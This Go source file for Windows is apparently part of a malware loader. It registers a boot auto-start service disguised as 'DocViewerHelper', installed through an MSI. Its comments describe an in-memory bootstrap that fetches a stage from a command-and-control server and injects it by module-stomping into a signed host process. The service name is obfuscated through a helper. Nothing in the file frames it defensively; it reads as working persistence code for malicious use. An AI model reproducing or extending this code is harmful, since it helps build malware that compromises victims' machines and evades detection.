//go:build windows

package main

import (
	"runtime"
	"time"

	"golang.org/x/sys/windows/svc"
)

// loaderService runs the staged in-memory bootstrap under the Service Control
// Manager so the MSI can register DocViewerHelper as a boot auto-start service.
// The work (runOnce -> C2 stage fetch + module-stomp into a signed host) runs
// in a goroutine; the process stays alive as a Running service until SCM stops.
type loaderService struct{}

func (m *loaderService) Execute(args []string, requests <-chan svc.ChangeRequest, changes chan<- svc.Status) (svcSpecific bool, exitCode uint32) {
	changes <- svc.Status{State: svc.StartPending}
	changes <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	go runOnce()
	for c := range requests {
		switch c.Cmd {
		case svc.Interrogate:
			changes <- c.CurrentStatus
		case svc.Stop, svc.Shutdown:
			changes <- svc.Status{State: svc.StopPending}
			return false, 0
		default:
		}
	}
	time.Sleep(2 * time.Second)
	return false, 0
}

// runAsService runs the loader under the SCM when launched as a real service.
// Returns true if handled as a service (main should not continue), false for
// interactive/manual/WMI runs so runOnce() is still executed by the caller.
func runAsService() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	if interactive, _ := svc.IsAnInteractiveSession(); interactive {
		return false
	}
	if err := svc.Run(xob(eSvcName), &loaderService{}); err != nil {
		// Not started by SCM (manual/WMI/loader-stomped) — caller runs core.
		return false
	}
	return true
}
